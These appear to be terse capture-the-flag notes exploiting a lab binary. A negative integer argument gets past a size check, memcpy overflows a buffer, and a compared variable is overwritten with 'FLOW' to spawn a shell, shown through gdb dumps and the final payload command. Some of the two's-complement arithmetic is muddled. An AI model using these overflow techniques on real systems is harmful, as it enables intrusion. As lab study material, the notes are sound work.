```
if (number == 0x574f4c46) 
    execl("/bin/sh", "sh", 0);
```
```
run "8" "AAAA"

   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
=> 0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)

the return of memcpy

0xbffff6b0:	..........	0x41414141	...[1]....	...[2]....
0xbffff6c0:	...[3]....	...[4]....	...[5]....	...[6]....
0xbffff6d0:	...[7]....	...[8]....	...[9]....	0x00000008

the var we compar with located at:

(gdb) x $esp+0x3c
0xbffff6dc:	0x00000008

p/d 0xbffff6dc - 0xbffff6b4 = 40

run "9" $(python -c 'print "A" * 40')

36 is the maximum number of bytes that can be copied into the buffer (9 * 4).

 -2^31 to 2^31 – 1
 ```

The "memcpy" function is vulnerable to buffer overflow


```
unhex 574f4c46 | rev ; echo
FLOW
```

00000000000000000000000000101100 = 44
change sign
10000000000000000000000000001011 = -44
-2147483604

10000000000000000000000000101100


Decimal from signed 2's complement
-2147483637

r -2147483637 $(python -c 'print "A"*40 + "FLOW"')

i r $ecx
ecx            0x2c	44



